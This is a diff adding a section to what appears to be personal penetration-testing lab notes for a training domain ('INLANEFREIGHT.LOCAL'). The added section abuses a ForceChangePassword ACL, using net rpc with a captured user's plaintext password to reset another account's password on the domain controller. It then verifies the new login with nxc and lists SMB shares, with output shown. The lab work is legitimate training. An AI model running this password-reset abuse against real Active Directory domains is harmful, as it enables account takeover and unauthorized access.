@@ -1619,3 +1619,25 @@ sudo bloodhound-python -u 'hporter' -p 'Gr8hambino!' -ns 172.16.8.3 -d INLANEFRE
 INFO: Done in 03M 05S
 INFO: Compressing output into 20261113132230_bloodhound.zip
 ```
+
+
+## ForcePasswordREset acl
+
+```bash
+net rpc password "ssmalls" 'Password123!' -U "INLANEFREIGHT.LOCAL"/"hporter"%'Gr8hambino!' -S DC01 
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/labs/aen]
+└─$ nxc smb 172.16.8.3 -u 'ssmalls' -p 'Password123!' --shares                                        
+SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Password123! 
+SMB         172.16.8.3      445    DC01             [*] Enumerated shares
+SMB         172.16.8.3      445    DC01             Share           Permissions     Remark
+SMB         172.16.8.3      445    DC01             -----           -----------     ------
+SMB         172.16.8.3      445    DC01             ADMIN$                          Remote Admin
+SMB         172.16.8.3      445    DC01             C$                              Default share
+SMB         172.16.8.3      445    DC01             Department Shares READ            Share for department users
+SMB         172.16.8.3      445    DC01             IPC$            READ            Remote IPC
+SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share 
+SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share 
+
+```
